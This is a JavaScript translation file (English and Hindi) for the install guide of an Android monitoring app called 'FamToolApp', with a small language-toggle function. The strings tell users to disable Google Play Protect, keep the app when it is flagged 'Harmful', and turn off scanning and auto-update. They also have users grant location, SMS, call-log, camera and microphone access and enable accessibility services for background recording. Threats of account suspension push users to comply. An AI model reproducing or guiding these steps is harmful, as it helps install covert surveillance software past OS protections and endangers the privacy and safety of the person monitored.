// Translation Dictionary
const translations = {
    en: {
        title: "Installation Policy & Critical Guide",
        subtitle: "Mandatory instructions for correct installation. Failure to follow these steps may result in feature failure or account suspension.",
        warning_title: "Strict Policy Warning",
        warning_text: "Our algorithm monitors service health. If permissions are deliberately disabled by the user after installation, your account may be <b>Frozen</b> or <b>Disabled</b> at any time. Refunds for paid limits will not be processed if services are inactive.",
        step1_title: "Mandatory: Disable Play Protect First",
        step1_desc: "Before installing the application, you <b>MUST</b> go to the Google Play Store and disable 'Play Protect'. If this is not done, the operating system will uninstall the app automatically.",
        graphic_off: "Both must be OFF",
        step2_title: "Login Activity: Initial Permissions",
        step2_desc: "During the login process (Login Activity), the app will request runtime permissions. You must click <b>'Allow'</b> or <b>'While using the app'</b> for all requests.",
        perm_location: "Location (Precise)",
        perm_sms: "SMS & Call Logs",
        perm_camera: "Camera & Microphone",
        step3_title: "Child Activity: System Services",
        step3_desc: "In the final setup screen (Child Activity), you will see a list of switches. You must tap each one and <b>Enable</b> the service in the Android Settings that open up.",
        graphic_all_on: "ALL Must be Enabled (Green)",
        step4_title: "Critical Fix: Camera/Audio Recording",
        attention: "ATTENTION:",
        step4_desc: "Android systems often block background recording even if permissions are given. To fix this, you must perform this specific action for the 'FamToolApp' Accessibility Service:",
        action_sequence: "The Action Sequence",
        step4_note: "Go to Settings > Accessibility > Installed Apps > FamToolApp. Turn it OFF, wait 2 seconds, then Turn it ON again. This resets the system flag.",
        
        // New Step 5 Translations
        step5_title: "Troubleshooting: 'Harmful App' / Disabled?",
        step5_desc: "Play Protect might identify this app as 'Harmful' because it monitors device activity. It may <b>Disable</b> the app automatically. You MUST check Play Protect settings to re-enable it.",
        graphic_harmful: "Harmful app disabled",
        graphic_enable_btn: "ENABLE APP",
        fix_step1: "Go to <b>Play Store > Play Protect</b>. Look for 'Harmful apps disabled'.",
        fix_step2: "Tap on 'FamToolApp' or 'Enable'. If asked, select <b>'Keep App (Unsafe)'</b>.",
        fix_step3: "<b>Finally:</b> Turn OFF 'Scan apps' and Go to Settings > Network > Auto-update > <b>'Don't auto-update'</b>.",

        // Step 6 (Updated for Android 13+)
        step6_title: "Android 13+ Setup: Restricted Settings",
        step6_desc: "On Android 13, 14 & 15, enabling Accessibility is blocked by default ('Restricted Setting'). You must manually allow it from the App Info menu.",
        step6_list1: "1. Open 'App Info' for FamToolApp",
        step6_list2: "2. Tap the 3-dots menu (Top Right)",
        step6_list3: "3. Select 'Allow restricted settings'",
        graphic_allow_restricted: "Allow restricted settings",

        // Step 7 Translations
        step7_title: "Mandatory: Verify Gmail",
        important_notice: "IMPORTANT:",
        step7_desc: "If you do not verify your Gmail address, your account may be PERMANENTLY DELETED at any time. It is mandatory to complete verification to keep your account active.",
        graphic_verify: "VERIFY EMAIL NOW"
    },
    hi: {
        title: "इंस्टॉलेशन नीति और महत्वपूर्ण गाइड",
        subtitle: "सही इंस्टॉलेशन के लिए अनिवार्य निर्देश। इन चरणों का पालन न करने पर फीचर काम नहीं करेंगे या खाता निलंबित हो सकता है।",
        warning_title: "सख्त नीति चेतावनी",
        warning_text: "हमारा एल्गोरिदम सर्विस की स्थिति की निगरानी करता है। यदि इंस्टॉलेशन के बाद जानबूझकर अनुमतियां (Permissions) बंद की जाती हैं, तो आपका खाता किसी भी समय <b>फ्रीज</b> या <b>डिसएबल</b> किया जा सकता है। सर्विस बंद होने पर पेड लिमिट्स के लिए रिफंड नहीं दिया जाएगा।",
        step1_title: "अनिवार्य: पहले Play Protect को अक्षम (Disable) करें",
        step1_desc: "एप्लिकेशन इंस्टॉल करने से पहले, आपको Google Play Store में जाना होगा और 'Play Protect' को अक्षम (Disable) करना होगा। यदि ऐसा नहीं किया जाता है, तो ऑपरेटिंग सिस्टम ऐप को अपने आप अनइंस्टॉल कर देगा।",
        graphic_off: "दोनों बंद (OFF) होने चाहिए",
        step2_title: "लॉगिन गतिविधि: शुरुआती अनुमतियां",
        step2_desc: "लॉगिन प्रक्रिया के दौरान, ऐप कुछ अनुमतियां मांगेगा। आपको सभी अनुरोधों के लिए <b>'Allow'</b> या <b>'While using the app'</b> पर क्लिक करना अनिवार्य है।",
        perm_location: "लोकेशन (सटीक)",
        perm_sms: "SMS और कॉल लॉग्स",
        perm_camera: "कैमरा और माइक्रोफोन",
        step3_title: "चाइल्ड गतिविधि: सिस्टम सर्विसेज",
        step3_desc: "अंतिम सेटअप स्क्रीन (Child Activity) में, आपको कुछ स्विच दिखाई देंगे। आपको हर एक पर टैप करना है और खुलने वाली Android सेटिंग्स में उस सर्विस को <b>इनेबल (Enable)</b> करना है।",
        graphic_all_on: "सभी इनेबल (हरे रंग में) होने चाहिए",
        step4_title: "महत्वपूर्ण फिक्स: कैमरा/ऑडियो रिकॉर्डिंग",
        attention: "ध्यान दें:",
        step4_desc: "Android सिस्टम अक्सर बैकग्राउंड रिकॉर्डिंग को रोक देते हैं। इसे ठीक करने के लिए, आपको 'FamToolApp' Accessibility Service के लिए यह क्रिया करनी होगी:",
        action_sequence: "क्रिया का क्रम",
        step4_note: "Settings > Accessibility > Installed Apps > FamToolApp पर जाएं। इसे OFF करें, 2 सेकंड रुकें, और फिर इसे दोबारा ON करें। इससे सिस्टम फ्लैग रीसेट हो जाता है।",
        
        // New Step 5 Hindi
        step5_title: "समस्या निवारण: 'Harmful App' / Disabled?",
        step5_desc: "Play Protect इस ऐप को 'हानिकारक' (Harmful) मानकर <b>Disable</b> कर सकता है क्योंकि यह निगरानी करता है। आपको Play Protect सेटिंग्स में जाकर इसे फिर से Enable करना होगा।",
        graphic_harmful: "Harmful app disabled",
        graphic_enable_btn: "ENABLE APP",
        fix_step1: "<b>Play Store > Play Protect</b> में जाएं। 'Harmful apps disabled' सेक्शन देखें।",
        fix_step2: "'FamToolApp' या 'Enable' पर क्लिक करें। यदि पूछा जाए, तो <b>'Keep App (Unsafe)'</b> चुनें।",
        fix_step3: "<b>अंत में:</b> 'Scan apps' को बंद करें और Settings > Network > Auto-update में जाकर <b>'Don't auto-update'</b> चुनें।",

        // Step 6 Hindi (Updated)
        step6_title: "Android 13+ सेटअप: प्रतिबंधित सेटिंग्स",
        step6_desc: "Android 13, 14 और 15 पर, एक्सेसिबिलिटी चालू करना 'Restricted Setting' द्वारा ब्लॉक हो सकता है। आपको इसे 'App Info' मेनू से मैन्युअल रूप से अनुमति देनी होगी।",
        step6_list1: "1. FamToolApp की 'App Info' में जाएं",
        step6_list2: "2. ऊपर दाईं ओर 3-डॉट्स मेनू दबाएं",
        step6_list3: "3. 'Allow restricted settings' चुनें",
        graphic_allow_restricted: "Allow restricted settings",

        // Step 7 Translations (Hindi)
        step7_title: "अनिवार्य: जीमेल सत्यापन (Gmail Verification)",
        important_notice: "महत्वपूर्ण:",
        step7_desc: "अगर कोई यूजर अपने जीमेल को वेरीफाइड नहीं करता है तो हम उसका अकाउंट कभी भी परमानेंटली डिलीट कर सकते हैं। इसलिए आपको जीमेल को वेरीफाइड करना जरूरी है।",
        graphic_verify: "अभी ईमेल सत्यापित करें"
    }
};

let currentLang = 'en';

function toggleLanguage() {
    currentLang = currentLang === 'en' ? 'hi' : 'en';
    const btnText = document.getElementById('lang-btn-text');
    
    // Update Button Text
    if(currentLang === 'en') {
        btnText.textContent = "हिंदी में पढ़ें";
    } else {
        btnText.textContent = "Read in English";
    }

    // Update Content
    document.querySelectorAll('[data-i18n]').forEach(element => {
        const key = element.getAttribute('data-i18n');
        if (translations[currentLang][key]) {
            // Preserve HTML tags like <b> if present in translation
            element.innerHTML = translations[currentLang][key];
        }
    });
}